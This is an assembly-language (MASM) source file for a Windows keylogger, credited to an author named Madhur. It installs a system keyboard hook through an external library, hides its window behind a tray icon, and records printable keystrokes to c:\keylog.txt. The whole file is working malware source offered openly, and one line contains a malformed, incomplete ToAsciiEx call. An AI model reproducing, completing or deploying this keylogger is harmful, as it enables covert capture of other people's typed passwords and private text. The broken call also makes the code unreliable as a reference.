;###################################################
;	Description:	Keylogger By Madhur 	
;	Version:  	1.0             
; 	Author:		Madhur               
;	Start Date: 	11/07/03,23:15:36                     
;	Name:  		keylog.asm
;	Assembler:  	MASM 6.14.8444
;	Linker:  	Link.exe 5.12.8078
;###################################################
.386                             
.model	flat,stdcall             
option 	casemap:none
.nolist
include	windows.inc
include	kernel32.inc
include user32.inc
include ..\macro.inc
include shell32.inc
include masm32.inc
include kl.inc
.listall
includelib masm32.lib
includelib shell32.lib
includelib user32.lib
includelib kernel32.lib             
includelib kl.lib
WinMain proto :DWORD,:DWORD,:DWORD,:DWORD
.data   	          
nid		NOTIFYICONDATA <0>
hicon		dd	0
icon		db	'ICON1',0
icon2		db	'ICON2',0
hfile		dd	0
lighticon	dd	0
eyeicon		dd	0
htimer		dd	0
.const               
ClassName	db 	"SimpleWinClass",0
AppName 	db 	"Our First Window",0     
tip		db	"KeyLogger By Madhur Ahuja",0
ID_ICON		equ	500
ID_ICON1	equ 	501

exit		db	"Exit",0
enable		db	"Enable",0
disable		db	"Disable",0
file		db	"c:\keylog.txt",0
IDEXIT		EQU	100
IDENABLE	EQU	101
IDDISABLE	EQU	102
WM_HOOK		EQU	WM_USER+1
TIMERID		EQU	600
.data?                           
hInstance 	HINSTANCE	?
CommandLine	LPSTR		?
hmenu		dd		?
.code                            
start:                           
        invoke  GetModuleHandle, NULL
	mov     hInstance,eax
	invoke  WinMain, hInstance, NULL, CommandLine,SW_HIDE		
	invoke  ExitProcess, eax
	
WinMain proc hInst:HINSTANCE, hPrevInst:HINSTANCE, CmdLine:LPSTR, CmdShow:DWORD
	LOCAL 	wc:WNDCLASSEX
	LOCAL 	msg:MSG
	LOCAL 	hwnd:HWND                         

	mov   	wc.cbSize, SIZEOF WNDCLASSEX
	mov   	wc.style, CS_HREDRAW or CS_VREDRAW
	mov   	wc.lpfnWndProc, OFFSET WndProc
	mov   	wc.cbClsExtra, NULL
	mov   	wc.cbWndExtra, NULL
	push  	hInstance
	pop   	wc.hInstance
	mov   	wc.hbrBackground, COLOR_WINDOW+1
	mov   	wc.lpszMenuName, NULL
	mov   	wc.lpszClassName, OFFSET ClassName
	invoke 	LoadIcon, hInst,addr icon
	mov	eyeicon,eax
	mov   	wc.hIcon, eax
	mov   	wc.hIconSm, eax
	invoke 	LoadCursor, NULL, IDC_ARROW
	mov   	wc.hCursor, eax
	invoke 	RegisterClassEx, addr wc

	
	invoke	CreatePopupMenu
	mov	hmenu,eax
	invoke	AppendMenu,hmenu,MF_STRING,IDENABLE,offset enable
	invoke	AppendMenu,hmenu,MF_STRING,IDEXIT,offset exit	
	
	INVOKE 	CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\
           	WS_OVERLAPPEDWINDOW or WS_MINIMIZE,CW_USEDEFAULT,\
          	CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\
           	hInst,NULL
	mov   	hwnd, eax
		
	mov	nid.cbSize,sizeof NOTIFYICONDATA
	m2m	nid.hwnd,hwnd
	mov	nid.uID,25h
	mov	nid.uFlags,NIF_MESSAGE OR NIF_TIP or NIF_ICON
	mov	nid.uCallbackMessage,WM_USER
	m2m	nid.hIcon,eyeicon
	invoke  lstrcpy,addr nid.szTip,addr tip 

	invoke 	ShowWindow, hwnd,SW_HIDE
	invoke 	Shell_NotifyIcon,NIM_ADD,addr nid		
	.WHILE TRUE
		invoke GetMessage, ADDR msg, NULL, 0, 0;
		.BREAK .IF (!eax)
		invoke TranslateMessage, ADDR msg
		invoke DispatchMessage, ADDR msg
	.ENDW
	mov     eax,msg.wParam
	ret
WinMain	endp

WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
local pt:POINT
local fss:WIN32_FIND_DATA
local chr:dword
local buff[20]:byte
	.if 	uMsg==WM_DESTROY
		invoke	_lclose,hfile
		invoke 	PostQuitMessage, NULL
		invoke 	Shell_NotifyIcon,NIM_DELETE,addr nid
		invoke	removehook
	.elseif	uMsg==WM_CREATE
		invoke	installhook,hWnd
		invoke	LoadIcon,hInstance,addr icon2
		mov	lighticon,eax
		invoke	FindFirstFile,addr file,addr fss
		.if	eax!=INVALID_HANDLE_VALUE
			invoke	_lopen,addr file,OF_READWRITE			
			mov	hfile,eax
		.else
			invoke	_lcreat,addr file,0
			mov	hfile,eax
		.endif
		
	.elseif uMsg==WM_USER
		.if	lParam==WM_RBUTTONDOWN
			invoke	GetCursorPos,addr pt
			invoke	TrackPopupMenu,hmenu,TPM_RIGHTALIGN or TPM_LEFTBUTTON,pt.x,pt.y,0,hWnd,0
		.endif		
	.elseif	uMsg==WM_COMMAND
		mov	eax,wParam
		.if	ax==IDEXIT
			invoke	SendMessage,hWnd,WM_DESTROY,0,0
		.elseif	ax==IDENABLE
			invoke	MessageBox,0,addr exit,addr exit,0
		.endif
	.elseif	uMsg==WM_HOOK
		invoke	SetTimer,hWnd,TIMERID,500,0
		m2m	nid.hIcon,lighticon
		invoke 	Shell_NotifyIcon,NIM_MODIFY,addr nid
		m2m	chr,wParam
		
		invoke	ToAsciiEx,chr,
		;invoke	dw2hex,chr,addr buff
		;invoke	lstrlen,addr buff
		.if	chr>=33 && chr<=126
			invoke	_lwrite,hfile,addr chr,1
		.endif
		
	.elseif	uMsg==WM_TIMER
		m2m	nid.hIcon,eyeicon
		invoke 	Shell_NotifyIcon,NIM_MODIFY,addr nid				
		
	.else
		invoke DefWindowProc, hWnd, uMsg, wParam, lParam		
		ret
	.endif
	xor 	eax,eax
	ret
WndProc endp                                 
end	start	                 
